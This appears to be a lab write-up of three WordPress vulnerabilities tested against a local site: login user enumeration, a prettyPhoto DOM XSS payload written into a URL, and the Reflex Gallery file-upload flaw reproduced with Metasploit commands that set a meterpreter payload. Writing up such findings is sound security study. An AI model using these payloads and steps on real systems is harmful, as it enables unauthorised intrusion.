1.(Required) User Enumeration

Summary: Different messages are shown for valid usernames with incorrect password and invalid usernames with incorrect passwords which gives an attacker hints.

Vulnerability type: User Enumeration
Tested in version: 4.2
Fixed in version: N/A

Steps to recreate:
•	Type in "admin" as username with incorrect password and it shows “ERROR: The password you entered for the username admin is incorrect”.
•	Type in "John" as username with incorrect password and it shows “ERROR: Invalid username”.

Affected source code:
https://core.trac.wordpress.org/browser/tags/4.2/src/wp-login.php



2. Multiple Plugins - jQuery prettyPhoto DOM Cross-Site Scripting (XSS)

Summary: The jQuery prettyPhoto library bundled with many plugins was found to be vulnerable to DOM Cross-Site Scripting (XSS).

Vulnerability type: cross site scripting (xss)
Tested in version: 3.1.3
Fixed in version: 3.1.5
CWE: CWE-79

Steps to recreate:
•	Add the following script to the end of the website link “#prettyPhoto[gallery]/1,<a onclick="alert(/You have been hacked/);">/”


3. Reflex Gallery <= 3.1.3 - Arbitrary File Upload

Summary:

Vulnerability type: upload
Tested in version: 3.1.3
Fixed in: 3.1.4
CVE: CVE-2015-4133
Metasploit: exploit/unix/webapp/wp_reflexgallery_file_upload
Steps to recreate:
•	Msfconsole
•	Search reflexgallery
•	Use 0
•	Options
•	set RHOST 192.168.33.10
•	set payload php/meterpreter/bind_tcp_ipv6_uuid
•	run

